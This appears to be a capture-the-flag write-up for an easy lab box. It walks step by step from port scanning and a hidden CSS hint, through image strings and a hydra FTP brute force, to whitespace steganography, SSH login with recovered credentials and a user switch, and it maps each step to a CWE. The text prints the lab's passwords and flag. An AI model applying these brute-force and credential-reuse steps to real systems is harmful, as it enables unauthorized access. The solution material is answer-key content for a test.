# Write-up : "Musa Troglodytarum"

**Target:** 10.10.0.X (the IP changes on every redeploy, recheck it)

**Objective:** Get user.txt

**Difficulty:** Easy

**Techniques:** web enumeration, hint hidden in CSS, HTTP redirection, `strings` on an image, FTP brute force, space/tab steganography, credential reuse, pivot between users

**Tools:** nmap, curl, wget, strings, hydra, ftp, ssh, python3

---

## 0. Set the target IP

```bash
ip=10.10.0.X
```
Every command below uses `$ip`.

---

## 1. Port scan

```bash
nmap -sV -p- $ip
```
Result: `21` (FTP), `22` (SSH), `80` (HTTP, "It works" page).

---

## 2. A hint hidden in the CSS

```bash
curl -s http://$ip/assets/style.css
```
A comment at the bottom gives the hidden page `/l3_B4n4N13r_D3s_M0nT4gN3s.php`. (The "video" on the home page is a trap.)

**Vulnerability:** sensitive info left in a secondary file (CWE-200).

---

## 3. Following the hidden page

```bash
curl -i http://$ip/l3_B4n4N13r_D3s_M0nT4gN3s.php
```
`-i` = displays the headers. The `Location:` header reveals the hidden folder `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`.

**Vulnerability:** unprotected "secret" path (CWE-425).

---

## 4. Download the hidden image directly

> Listing the folder 301-redirects to a broken ServerName (10.10.0.10). So we grab the file directly:

```bash
wget "http://$ip/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png"
```

**Vulnerability:** directory listing enabled (CWE-548).

---

## 5. Read the hidden text + build the wordlist

```bash
strings Hot_Babe.png | grep -i FTP
strings Hot_Babe.png | sed -n '/One of these is the password/,$p' | tail -n +2 > passwords.txt
wc -l passwords.txt
```
 login `banane_celeste` + ~200 candidate passwords in `passwords.txt`.

**Vulnerability:** login and passwords hidden in an image (CWE-200).

---

## 6. FTP brute force

```bash
hydra -l banane_celeste -P passwords.txt -f -t 4 ftp://$ip
```
`-t 4` = few parallel connections (the FTP drops fast reconnects).
> If you get "too many connection errors", lower it to `-t 1`:
> ```bash
> hydra -l banane_celeste -P passwords.txt -f -t 1 ftp://$ip
> ```

**Vulnerability:** no protection against brute force (CWE-307).

---

## 7. Grab the file over FTP

```bash
wget "ftp://banane_celeste:<FOUND_PASSWORD>@$ip/Valerian's_Creds.txt"
mv "Valerian's_Creds.txt" creds.txt
cat -A creds.txt | head
```
`cat -A` shows the tabs `^I` and spaces  the file is space/tab steganography. (We rename it to `creds.txt` to avoid the apostrophe that breaks commands.)

---

## 8. Decode the space/tab steganography (terminal)

> CyberChef "From Binary" does NOT work here: the encoding is **1 byte per line** (on the last 8 bits) with separator lines, so a continuous bitstream misaligns. Use this instead:

```bash
python3 -c 'out=""
for l in open("creds.txt"):
    s=l.rstrip("\r\n")
    if len(s)>2 and set(s)<=set(" \t"):
        out+=chr(int(s.replace(" ","0").replace(chr(9),"1")[-8:],2))
print(out)'
```
 `User: valerian` / `Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP`

**Vulnerability:** credentials hidden by steganography (CWE-311).

---

## 9. SSH connection as valerian

```bash
ssh valerian@$ip
```
(password: `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)

> If you get "REMOTE HOST IDENTIFICATION HAS CHANGED" (box redeployed), clear the old key then retry:
> ```bash
> ssh-keygen -f /root/.ssh/known_hosts -R $ip
> ```

The welcome message hints at a "s3cr3t hiding place".

**Vulnerability:** reuse of exposed credentials (CWE-522).

---

## 10. Finding the hiding place

```bash
find / -iname "*s3cr3t*" 2>/dev/null
cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```
 gabriel's password: `ca_serait_jamais_arrive_en_haskell`

**Vulnerability:** plaintext password in a file (CWE-256).

---

## 11. Becoming gabriel and reading the flag

```bash
su gabriel
cat ~/user.txt
```
 `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`

---

## Summary of steps

1. `nmap`: 21/22/80.
2. `style.css`: the hidden `.php` page.
3. `curl -i` on that page: redirect (302) to a hidden folder.
4. `wget` the image `Hot_Babe.png` directly.
5. `strings`: FTP login + wordlist.
6. `hydra -t 4`: the FTP password.
7. FTP: `Valerian's_Creds.txt` (spaces/tabs)  renamed `creds.txt`.
8. terminal decode: valerian's password.
9. `ssh valerian`, hidden message: gabriel's password.
10. `su gabriel`: `user.txt`.

## Exploited vulnerabilities

| # | Vulnerability | CWE |
|---|--------|-----|
| 1 | Hint in a CSS comment | CWE-200 |
| 2 | Unprotected secret path | CWE-425 |
| 3 | Directory listing enabled | CWE-548 |
| 4 | Login and wordlist hidden in an image | CWE-200 |
| 5 | No FTP anti-brute-force | CWE-307 |
| 6 | Whitespace stego | CWE-311 |
| 7 | Credential reuse | CWE-522 |
| 8 | Plaintext password in a file | CWE-256 |

## Key takeaways
- Always read secondary files (CSS, comments): the hint was there.
- A `curl` that shows nothing = a redirect, redo it with `-i`.
- `strings` reveals text hidden in an image.
- Space/tab stego here = **terminal decode** (CyberChef isn't enough for this format).
- The "video" is a deliberate trap.
